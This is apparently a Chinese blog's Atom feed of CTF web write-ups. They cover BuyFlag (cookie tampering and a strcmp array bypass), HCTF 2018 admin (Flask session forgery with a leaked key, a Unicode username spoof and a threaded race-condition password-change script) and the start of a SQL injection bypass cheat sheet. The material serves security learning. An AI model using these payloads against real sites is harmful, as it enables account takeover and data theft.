    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1"></a>[极客大挑战 2019]BuyFlag 1</h1><p>点击menu进到payflag页面:</p><p><img src="https://img-blog.csdnimg.cn/20200405204840476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM0ODg5NA==,size_16,color_FFFFFF,t_70"></p><p>抓包:</p><p><img src="https://img-blog.csdnimg.cn/20200405204840476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM0ODg5NA==,size_16,color_FFFFFF,t_70"></p><p>显而易见，把user改成1试一下:</p><p><img src="https://img-blog.csdnimg.cn/20200405205016646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM0ODg5NA==,size_16,color_FFFFFF,t_70"></p><p>post参数password进去:</p><p><img src="https://img-blog.csdnimg.cn/20200405205135893.png"></p><p>要付钱。结合网页页面：</p><p><img src="https://img-blog.csdnimg.cn/20200405205213649.png"></p><p>盲猜变量是money，传个money进去：</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">password=404<br>&amp;money=100000000<br></code></pre></div></td></tr></table></figure><p>数值太长了。。。试一下科学记数法：</p><p><img src="https://img-blog.csdnimg.cn/2020040520544673.png"></p><p>拿到flag，不过看别人的wp，好像还有一个利用strcmp函数特性绕过的办法：</p><p>strcmp()函数漏洞介绍：<br><a href="https://blog.csdn.net/cherrie007/article/details/77473817">https://blog.csdn.net/cherrie007/article/details/77473817</a></p><p>基于strcmp函数漏洞的</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pay.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>13228041-f619-430d-b2c1-d20ab1fe38f8.node3.buuoj.cn<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>************<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>32<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://13228041-f619-430d-b2c1-d20ab1fe38f8.node3.buuoj.cn<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://13228041-f619-430d-b2c1-d20ab1fe38f8.node3.buuoj.cn/index.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>user=1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="pgsql"><span class="hljs-keyword">password</span>=<span class="hljs-number">404</span></span><br><span class="pgsql">&amp;<span class="hljs-type">money</span>[]=<span class="hljs-number">100000000</span></span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCTF 2018_admin 1</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5BHCTF%202018%5Dadmin%201/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5BHCTF%202018%5Dadmin%201/</url>
    
    <content type="html"><![CDATA[<h1 id="HCTF-2018-admin-1"><a href="#HCTF-2018-admin-1" class="headerlink" title="[HCTF 2018]admin 1"></a>[HCTF 2018]admin 1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结一下3个做法：</p><ul><li>法1：伪造session</li><li>法2：unicode欺骗</li><li>法3：条件竞争</li></ul><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>f12查看源代码</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br></code></pre></div></td></tr></table></figure><p>发现提示要成为admin</p><p>随便注册个账号，登入后，在</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">view</span>-<span class="hljs-keyword">source</span>:http://admin.<span class="hljs-number">2018</span>.hctf.io/<span class="hljs-keyword">change</span><br></code></pre></div></td></tr></table></figure><p>发现提示</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></code></pre></div></td></tr></table></figure><p>于是下载源码</p><h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>拿到代码后，简单的查看了下路由</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br></code></pre></div></td></tr></table></figure><p>查看一下路由，功能非常单一：登录，改密码，退出，注册，edit。</p><p>但edit功能也是个假功能，并且发现并不会存在sql注入之类的问题，也没有文件写入或者是一些危险的函数，此时陷入了困境。</p><h2 id="解法一：session伪造"><a href="#解法一：session伪造" class="headerlink" title="解法一：session伪造"></a>解法一：session伪造</h2><h3 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h3><p>想到的第一个方法：session伪造</p><p>于是尝试伪造session，根据ph写的文章</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.leavesongs.com<span class="hljs-regexp">/PENETRATION/</span>client-session-security.html<br></code></pre></div></td></tr></table></figure><p>可以知道flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p>所以我们构造脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span><br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></div></td></tr></table></figure><p>然后可以尝试读取我们的session内容</p><p><a href="https://p5.ssl.qhimg.com/t01d379cb422b901767.png"><img src="https://p5.ssl.qhimg.com/t01d379cb422b901767.png" alt="img"></a></p><p>此时容易想到伪造admin得到flag，因为看到代码中</p><p><a href="https://p2.ssl.qhimg.com/t017e7e3269015fdfd8.png"><img src="https://p2.ssl.qhimg.com/t017e7e3269015fdfd8.png" alt="img"></a></p><p>想到把name伪造为admin，于是github上找了个脚本</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/noraj/</span>flask-session-cookie-manager<br></code></pre></div></td></tr></table></figure><p>尝试伪造</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;<span class="hljs-string">u&#x27;csrf_token&#x27;</span>: <span class="hljs-string">&#x27;bedddc7469bf16ac02ffd69664abb7abf7e3529c&#x27;</span>, <span class="hljs-string">u&#x27;user_id&#x27;</span>: <span class="hljs-string">u&#x27;1&#x27;</span>, <span class="hljs-string">u&#x27;name&#x27;</span>: <span class="hljs-string">u&#x27;admin&#x27;</span>, <span class="hljs-string">u&#x27;image&#x27;</span>: <span class="hljs-string">&#x27;aHme&#x27;</span>, <span class="hljs-string">u&#x27;_fresh&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">u&#x27;_id&#x27;</span>: <span class="hljs-string">&#x27;26a01e32366425679ab7738579d3ef6795cad198cd94529cb495fcdccc9c3c864f851207101b38feb17ea8e7e7d096de8cad480b656f785991abc8656938182e&#x27;</span>&#125;<br></code></pre></div></td></tr></table></figure><p>但是需要SECRET_KEY</p><p>我们发现config.py中存在</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">SECRET_KEY</span> = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) or <span class="hljs-string">&#x27;ckj123&#x27;</span><br></code></pre></div></td></tr></table></figure><p>于是尝试ckj123</p><p><a href="https://p3.ssl.qhimg.com/t011f2f495345b7b523.png"><img src="https://p3.ssl.qhimg.com/t011f2f495345b7b523.png" alt="img"></a></p><p>但是比赛的时候很遗憾，最后以失败告终，当时以为key不是SECRET_KEY，就没有深究</p><p>后来发现问题<a href="https://graneed.hatenablog.com/entry/2018/11/11/212048">https://graneed.hatenablog.com/entry/2018/11/11/212048</a></p><p>似乎python3和python2的flask session生成机制不同</p><p><a href="https://p5.ssl.qhimg.com/t01ccc362b56b3fc055.png"><img src="https://p5.ssl.qhimg.com/t01ccc362b56b3fc055.png" alt="img"></a></p><p>改用python3生成即可成功伪造管理员</p><p><a href="https://p1.ssl.qhimg.com/t01312c49a0bdefdff2.png"><img src="https://p1.ssl.qhimg.com/t01312c49a0bdefdff2.png" alt="img"></a></p><h2 id="解法二：Unicode欺骗"><a href="#解法二：Unicode欺骗" class="headerlink" title="解法二：Unicode欺骗"></a>解法二：Unicode欺骗</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在非常迷茫的时候，肯定想到必须得结合改密码功能，那会不会是change这里有问题，于是仔细去看代码，发现这样一句</p><p><a href="https://p1.ssl.qhimg.com/t01a62718e1f4b58647.png"><img src="https://p1.ssl.qhimg.com/t01a62718e1f4b58647.png" alt="img"></a></p><p>好奇怪，为什么要转小写呢？</p><p>难道注册的时候没有转大小写吗？</p><p><a href="https://p0.ssl.qhimg.com/t0185c9b99610dec9e3.png"><img src="https://p0.ssl.qhimg.com/t0185c9b99610dec9e3.png" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t0142ed79c38e510873.png"><img src="https://p2.ssl.qhimg.com/t0142ed79c38e510873.png" alt="img"></a></p><p>但随后发现注册和登录都用了转小写，注册ADMIN的计划失败</p><p>但是又有一个特别的地方，我们python转小写一般用的都是lower()，为什么这里是strlower()?</p><p>有没有什么不一样的地方呢？于是想到跟进一下函数</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></div></td></tr></table></figure><p>本能的去研究了一下nodeprep.prepare</p><p>找到对应的库</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/twisted/</span>twisted<br></code></pre></div></td></tr></table></figure><p>这个方法很容易懂，即将大写字母转为小写</p><p>但是很快就容易发现问题</p><p><a href="https://p2.ssl.qhimg.com/t01c3ca861181957082.png"><img src="https://p2.ssl.qhimg.com/t01c3ca861181957082.png" alt="img"></a></p><p><a href="https://p5.ssl.qhimg.com/t01ece0c53877fc0052.png"><img src="https://p5.ssl.qhimg.com/t01ece0c53877fc0052.png" alt="img"></a></p><p>版本差的可真多，十有八九这里有猫腻</p><h3 id="unicode问题"><a href="#unicode问题" class="headerlink" title="unicode问题"></a>unicode问题</h3><p>后来搜到这样一篇文章</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://tw.saowen.com/a/<span class="hljs-number">72</span>b<span class="hljs-number">7816</span>b<span class="hljs-number">29</span>ef<span class="hljs-number">30533882</span>a<span class="hljs-number">07</span>a<span class="hljs-number">4</span>e<span class="hljs-number">1040</span>f<span class="hljs-number">696</span>b<span class="hljs-number">01</span>e<span class="hljs-number">7888</span>d<span class="hljs-number">60255</span>ab<span class="hljs-number">89</span>d<span class="hljs-number">37</span>cf<span class="hljs-number">2</span>f<span class="hljs-number">18</span>f<span class="hljs-number">3</span>e<br></code></pre></div></td></tr></table></figure><p>对于如下字母</p><p><a href="https://p1.ssl.qhimg.com/t01b1cdb8fd0fdb6a3c.png"><img src="https://p1.ssl.qhimg.com/t01b1cdb8fd0fdb6a3c.png" alt="img"></a></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ<br></code></pre></div></td></tr></table></figure><p>具体编码可查<a href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a></p><p>nodeprep.prepare会进行如下操作</p><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">ᴀ -&gt; A -&gt; a<br></code></pre></div></td></tr></table></figure><p><a href="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png"><img src="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png" alt="img"></a></p><p>即第一次将其转换为大写，第二次将其转换为小写</p><p>那么是否可以用来bypass题目呢？</p><h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p>我们容易想到一个攻击链：</p><ul><li>注册用户ᴀdmin</li><li>登录用户ᴀdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul><p>于是成功得到如下flag</p><p><a href="https://p4.ssl.qhimg.com/t01ff30572eb8252865.png"><img src="https://p4.ssl.qhimg.com/t01ff30572eb8252865.png" alt="img"></a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>这里的unicode欺骗，让我想起了一道sql注入题目</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">skysec.top<span class="hljs-regexp">/2018/</span><span class="hljs-number">03</span><span class="hljs-regexp">/21/</span>从一道题深入mysql字符集与比对方法collation/<br></code></pre></div></td></tr></table></figure><h2 id="解法三：条件竞争"><a href="#解法三：条件竞争" class="headerlink" title="解法三：条件竞争"></a>解法三：条件竞争</h2><p>该方法也是赛后交流才发现的，感觉有点意思</p><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>我们发现代码在处理session赋值的时候</p><p><a href="https://p2.ssl.qhimg.com/t015483fb615c3f782b.png"><img src="https://p2.ssl.qhimg.com/t015483fb615c3f782b.png" alt="img"></a></p><p><a href="https://p4.ssl.qhimg.com/t0169918a9c850e8ec9.png"><img src="https://p4.ssl.qhimg.com/t0169918a9c850e8ec9.png" alt="img"></a><br> 两个危险操作，一个登陆一个改密码，都是在不安全check身份的情况下，直接先赋值了session</p><p>那么这里就会存在一些风险</p><p>那么我们设想，能不能利用这一点，改掉admin的密码呢？</p><p>例如：</p><ul><li>我们登录sky用户，得到session a</li><li>用session a去登录触发admin赋值</li><li>改密码，此时session a已经被更改为session b了，即session name=admin</li><li>成功更改admin的密码</li></ul><p>但是构想是美好的，这里存在问题，即前两步中，如果我们的Session a是登录后的，那么是无法再去登录admin的</p><p><a href="https://p2.ssl.qhimg.com/t019e3bbbe0d730d41d.png"><img src="https://p2.ssl.qhimg.com/t019e3bbbe0d730d41d.png" alt="img"></a></p><p>我们会在第一步直接跳转，所以这里需要条件竞争</p><h3 id="条件竞争思路"><a href="#条件竞争思路" class="headerlink" title="条件竞争思路"></a>条件竞争思路</h3><p>那么能不能避开这个check呢？</p><p>答案是显然的，我们双线并进</p><p>当我们的一个进程运行到改密码</p><p><a href="https://p0.ssl.qhimg.com/t01d48a760805ea0e10.png"><img src="https://p0.ssl.qhimg.com/t01d48a760805ea0e10.png" alt="img"></a></p><p>这里的时候</p><p>我们的另一个进程正好退出了这个用户，并且来到了登录的这个位置</p><p><a href="https://p3.ssl.qhimg.com/t018dad3539436692a9.png"><img src="https://p3.ssl.qhimg.com/t018dad3539436692a9.png" alt="img"></a></p><p>此时正好session name变为admin，change密码正好更改了管理员密码</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>这里直接用研友syang<a href="https://github.com/Whitzard">@Whitzard</a>的脚本了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">s, username, password</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>        <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> s.post(<span class="hljs-string">&quot;http://admin.2018.hctf.io/login&quot;</span>, data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> s.get(<span class="hljs-string">&quot;http://admin.2018.hctf.io/logout&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">s, newpassword</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;newpassword&#x27;</span>:newpassword<br>    &#125;<br>    <span class="hljs-keyword">return</span> s.post(<span class="hljs-string">&quot;http://admin.2018.hctf.io/change&quot;</span>, data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func1</span>(<span class="hljs-params">s</span>):</span><br>    login(s, <span class="hljs-string">&#x27;skysec&#x27;</span>, <span class="hljs-string">&#x27;skysec&#x27;</span>)<br>    change(s, <span class="hljs-string">&#x27;skysec&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func2</span>(<span class="hljs-params">s</span>):</span><br>    logout(s)<br>    res = login(s, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;skysec&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finish&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        s = requests.Session()<br>        t1 = threading.Thread(target=func1, args=(s,))<br>        t2 = threading.Thread(target=func2, args=(s,))<br>        t1.start()<br>        t2.start()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></div></td></tr></table></figure><p>注：但在后期测试中我没能成功，后面再研究一下，但我认为思路应该是正确的。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目可能因为一些失误有一些非预期，但是能进行这么多解法，对学习还是非常有帮助的。</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql基本注入</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/sql%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/sql%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql基本注入"><a href="#sql基本注入" class="headerlink" title="sql基本注入"></a>sql基本注入</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">/*select绕过*/</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br><span class="hljs-string">/*union绕过*/</span><br><span class="hljs-string">利用/*!union*/可以绕过对union的过滤</span><br><span class="hljs-string">/*空格绕过*/</span><br><span class="hljs-string">%09 %0a %0b %0c %0d /**/ /*!*/括号</span><br></code></pre></div></td></tr></table></figure><p>基本注入流程</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),version()%23</span><br><span 